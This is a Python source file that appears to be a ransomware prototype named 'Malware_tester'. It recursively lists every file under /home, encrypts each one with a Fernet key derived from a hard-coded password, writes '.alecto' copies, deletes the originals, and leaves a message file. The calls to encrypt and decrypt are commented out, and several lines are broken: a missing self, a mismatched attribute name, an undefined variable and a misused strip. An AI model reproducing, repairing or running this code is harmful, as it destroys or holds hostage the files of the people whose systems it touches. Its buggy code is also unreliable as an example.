from cryptography.fernet import Fernet
from pprint import pprint
import hashlib,pathlib,base64,sys,os

file_path = "/home"

def file_find(file_path,path_list=[],file_name="target_file_path_list.txt"):
    if os.path.isdir(file_path) == True:
        for path in pathlib.Path(file_path).glob("*"):
            file_find(f"{path}")
    else:
        path_list.append(f"{file_path}")
    return path_list

class Malware_tester:
    def __init__():
        self.file_path = "/home"
        self.password_data = "password"
        self.mesg_txt = "Welcome_Friend.alecto"

    def key_base(self):
        return base64.b64encode((hashlib.md5(self.password.encode()).hexdigest()).encode())

    
    def file_encrypt(self,path_list):
        key = Fernet(self.key_base())
        for file_path in path_list:
            encrypt_word = key.encrypt(open(file_path,"r",encoding="utf-8").read())
            with open(f"{file_path}.alecto","wb+")as file_encrypt:
                file_encrypt.write(encrypt_word)
            os.remove(file_path)

    def file_decrypt(self,file_path):
        key = Fernet(self.key_base())
        for file_path in path_list:
            decrypt_word = key.decrypt(open(file_path,"rb").read()).decode()
            file_name = file_path.strip(".alecto")
            with open(file_name,"w+")as file_decrypt:
                file_decrypt.write(decrypt_word)
            os.remove(file_path)

    def message_text(self):
        with open(self.mesg_txt,"w+",encoding="utf-8")as file_mesg:
            message_data = "Test_Rootkit"
            file_mesg.write(message_data)

def main():
    malware_tester = Malware_tester()
    malware_tester.message_text()
    #file_encrypt(file_find())
    #file_decrypt(file_find())


if __name__ == "__main__":
   main() 
